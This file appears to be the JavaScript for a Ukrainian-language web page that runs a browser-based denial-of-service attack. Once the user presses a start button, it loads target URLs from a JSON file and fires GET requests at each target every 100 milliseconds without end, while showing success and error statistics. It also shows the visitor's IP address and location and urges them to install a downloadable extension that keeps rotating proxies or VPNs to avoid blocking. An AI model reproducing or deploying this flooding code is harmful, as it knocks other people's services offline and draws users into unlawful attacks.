window.addEventListener("load", function () {
	let ipApi = "http://ip-api.com/json/?fields=61439";
	let conectionMsg = document.querySelector("#DataContainer");
	let container = document.querySelector("#msgText");
	let statsList = document.getElementById("dataWraper");
	let startBtn = document.querySelector("#startAtackBtn");
	let vpnBtn = document.querySelector("#btnVpn");
	let proxyBtn = document.querySelector("#btnProxy");
	let interval = 100;
	let extantionLink = "extantion/extantion.zip";

	drawConectionInfo();
	function drawConectionInfo() {
		fetch(ipApi)
			.then(function (responce) {
				return responce.json();
			})
			.then(function (data) {
				let innerData = `<p class="ip data-text">ваш IP ${data.query}</p>
				<p class="contry data-text">ваша країна ${data.country}</p>
				<p class="city data-text">Ваше місто ${data.regionName}</p>
				<p class="provider data-text">Ваш провайдер ${data.as}</p>`;
				conectionMsg.innerHTML = innerData;
			});
		checkBrowser();
	}
	function checkBrowser() {
		var browserName = (function (agent) {
			switch (true) {
				case agent.indexOf("edge") > -1:
					return "MS Edge";
				case agent.indexOf("edg/") > -1:
					return "Edge ( chromium based)";
				case agent.indexOf("opr") > -1 && !!window.opr:
					return "Opera";
				case agent.indexOf("chrome") > -1 && !!window.chrome:
					return "Chrome";
				case agent.indexOf("trident") > -1:
					return "MS IE";
				case agent.indexOf("firefox") > -1:
					return "Mozilla Firefox";
				case agent.indexOf("safari") > -1:
					return "Safari";
				default:
					return "other";
			}
		})(window.navigator.userAgent.toLowerCase());
		if (browserName !== "Chrome") {
			container.classList.add("err");
			container.parentNode.classList.remove("hide");
			container.innerText = "покищо наш сайт коректно працює лише з браузером Google Chrome. Будь ласка встановіть браузер Google Chrome, також будьте уважні і скачуйте з офіційного сайту Google";
		} else {
			checkExtantion();
		}
	}
	function checkExtantion() {
		let isInstaledExtantion = document.body.dataset.extantion === "true";
		if (isInstaledExtantion) {
		} else {
			container.classList.add("err");
			container.parentNode.classList.remove("hide");
			container.innerText =
				"Для коректної роботи сайту необхідно встановити розширення для вашого браузеру, яке буде самостійно підключати вас до проксі або впн і буде автоматично вас перепідключати через певні проміжки часу";
			let link = document.createElement("a");
			link.className = "download-lnk";
			link.setAttribute("href", extantionLink);
			link.textContent = "Завантажити розширення до браузера";
			container.appendChild(link);
		}
	}

	startBtn.addEventListener("click", function () {
		getTargets(sendQuery);
	});
	function getTargets(a) {
		let targetLink = "js/targets.json";
		let targets = [];
		fetch(targetLink, {
			method: "GET",
			// mode: "no-cors",
		})
			.then(function (responce) {
				return responce.json();
			})
			.then(function (data) {
				for (const key in data) {
					targets.push(data[key]);
				}
				return a(targets);
			})

			.catch(function (err) {
				console.log(err);
				alert("Помилка завантаження цілей");
			});
	}
	function sendQuery(targets) {
		let statsData = [];

		targets.forEach(function (k) {
			statsData.push({ host: k, querySum: 0, err: false, sucQuery: 0, errQuery: 0 });
		});

		setInterval(function () {
			targets.forEach(function (k, i) {
				statsData[i].querySum++;
				fetch(k, {
					method: "GET",
					mode: "no-cors",
					cache: "no-cache",
					headers: { "Referrer-Policy": "no-referrer" },
				})
					.then(function (responce) {
						statsData[i].err = false;
						statsData[i].sucQuery++;
					})
					.catch(function (error) {
						statsData[i].err = true;
						statsData[i].errQuery++;
					});
			});
		}, interval);
		drawSatats(statsData);
	}
	function drawSatats(data) {
		let drawSuc = document.querySelector("#dataSuc"),
			sucBar = document.querySelector("#sucBar"),
			sucCir = document.querySelector("#sucCir"),
			drawWait = document.querySelector("#dataWait"),
			waitCir = document.querySelector("#waitCir"),
			waitBar = document.querySelector("#waitBar"),
			drawErr = document.querySelector("#dataErr"),
			errCir = document.querySelector("#errCir"),
			errBar = document.querySelector("#errBar");
		let mainQueries = 0,
			mainErr = 0,
			mainSuc = 0,
			waitQuerys = 0;
		setInterval(function () {
			(errPersenatge = Math.floor((mainErr / mainQueries) * 100)), (sucPercentage = Math.floor((mainSuc / mainQueries) * 100)), (waitPercentage = Math.floor((waitQuerys / mainQueries) * 100));
			waitQuerys = mainQueries - (mainErr + mainSuc);

			let statsMarkUp = "";
			data.forEach(function (a) {
				let errStatus = "suc";
				if (a.err === true) {
					errStatus = "err";
				}
				statsMarkUp += `<li class="target-item ${errStatus}"><span class="data-link">${a.host}</span><span class="data-sum">${a.querySum}</span><span class="data-suc">${a.sucQuery}</span><span class="data-err">${a.errQuery}</span></li>`;
				mainQueries += a.querySum;
				mainErr += a.errQuery;
				mainSuc += a.sucQuery;
			});

			statsList.innerHTML = statsMarkUp;
			// draw main iformation
			drawSuc.innerText = sucPercentage;
			sucBar.style.width = sucPercentage + "%";
			// cir
			sucCir.style.stroke = "rgba(164, 255, 157, 0.541)";
			sucCir.style.strokeDasharray = sucPercentage + " " + 100;
			// cir wait
			drawWait.innerText = waitPercentage;
			waitCir.style.stroke = "rgba(193, 193, 193, 0.708)";
			waitCir.style.strokeDasharray = waitPercentage + " " + 100;
			waitCir.style.strokeDashoffset = "-" + sucPercentage - 0.2;
			waitBar.style.width = waitPercentage + "%";
			drawErr.innerText = errPersenatge;
			// cirr err
			errCir.style.stroke = "rgba(251, 163, 163, 0.564)";
			errCir.style.strokeDasharray = errPersenatge + " " + 100;
			errCir.style.strokeDashoffset = "-" + parseFloat(waitPercentage + sucPercentage + 0.4);
			errBar.style.width = errPersenatge + "%";
			console.log("-" + parseFloat(waitPercentage + sucPercentage - 0.2) + " " + waitPercentage + " " + sucPercentage);
		}, 1000);
	}
});
let lightModeBtn = document.querySelector("#lightModeCheckBox");

lightModeBtn.addEventListener("click", function () {
	document.body.classList.toggle("dark");
});
